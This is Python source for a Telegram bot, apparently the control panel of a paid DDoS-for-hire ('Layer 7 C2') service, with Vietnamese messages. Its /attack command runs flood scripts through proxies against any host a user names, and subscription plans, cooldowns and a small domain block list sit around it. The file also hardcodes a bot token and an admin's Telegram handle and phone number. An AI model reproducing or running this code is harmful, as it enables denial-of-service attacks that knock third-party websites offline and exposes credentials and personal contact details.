import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot_token = '6788383519:AAF9dorWmcft_unAYqCRNIW2PzWbt1jAEBg'

bot = telebot.TeleBot(bot_token)

proxy_update_count = 0
last_proxy_update_time = time.time()

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
    
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn Không Có Quyền Sử Dụng Lệnh Này.')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Nhập Đúng Định Dạng : /add + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Đã Thêm {user_id}. Có Thể Sử Dụng Lệnh 30 Ngày.')

load_users_from_database()

@bot.message_handler(commands=['hello', '2005'])
def help(message):
    help_text = '''
╔────────────────────────────────╗
│   - /methods [ Show All Methods Layer 7 ]
│   - /admin [ Show INFO Admin ]
│   - /plan [ Show Account Plan YOU ! ]
│   - /time [ Thời Gian Bot Hoạt Động
╚────────────────────────────────╝
'''
    bot.reply_to(message, help_text)
    

@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
   METHODS LAYER 7 ALPHA C2
      - TLS-NQ
      - RAW-ALPHA
      - FLOOD-ALPHA
      - ATTACK MAX SECONS : 45 S !
      - /attack [ METHODS ] + [ HOST ]
'''
    bot.reply_to(message, help_text)


@bot.message_handler(commands=['admin'])
def methods(message):
    help_text = '''
      ADMIN
- TeLe : t.me/begaudeptry | 
- ZaLo : 0366236402 |
'''
    bot.reply_to(message, help_text)


@bot.message_handler(commands=['plan'])
def methods(message):
    help_text = '''
   Account Plan YOU !
      - Max Attack Time : [ 45 Duration ]
      - Max Run : [ 0/7 | 1 Hous ]
      - Power Attack : [ 45 % ]
      - Conc Attack : [ 1/10 ]
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 120:
                cmd_process.terminate()
                bot.reply_to(message, "Attack Successfully Thank You .")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Attack How To |  : /attack + [ Methods ] + [ Host ]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 150:
        remaining_time = int(150 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"How To Fist Secons {remaining_time} Attack Not Spam !.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    blocked_domains = ["chinhphu.vn", "haidz.com"]   
    if method == 'TLS-NQ' or method == 'BYPASS-GREM':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f" Bạn Không Được Phép Tấn Công Trang Web Này ❌ {blocked_domain}")
                return

    if method in ['TLS-NQ', 'RAW-ALPHA', 'FLOOD-ALPHA']:
        # Update the command and duration based on the selected method
        if method == 'TLS-NQ':
            command = ["node", "TLS-NQ.js", host, "45", "90", "17", "GET", "proxy.txt"]
            duration = 45
        if method == 'RAW-ALPHA':
            command = ["node", "RAW-ALPHA.js", host, "45", "90", "20", "proxy.txt"]
            duration = 45
        if method == 'FLOOD-ALPHA':
            command = ["node", "FLOOD-ALPHA.js", host, "45", "90", "20", "proxy.txt"]
            duration = 45

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'   Attack SuccesFully Sent !\n     Host : {host}\n     Port : 443 / 80\n     Time : {duration}\n     Methods : {method}\n     Conc : 1/10\n     Staus : Success !')
    else:
        bot.reply_to(message, 'Attack Not Indival Methods Layer 7.')
       
# Hàm tính thời gian hoạt động của bot
start_time = time.time()
@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} Giờ, {minutes} Phút, {seconds} Giây'
    bot.reply_to(message, f'Bot Đã Hoạt Động Được : {uptime_str}')

@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Admin : t.me/beaudeptry |')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
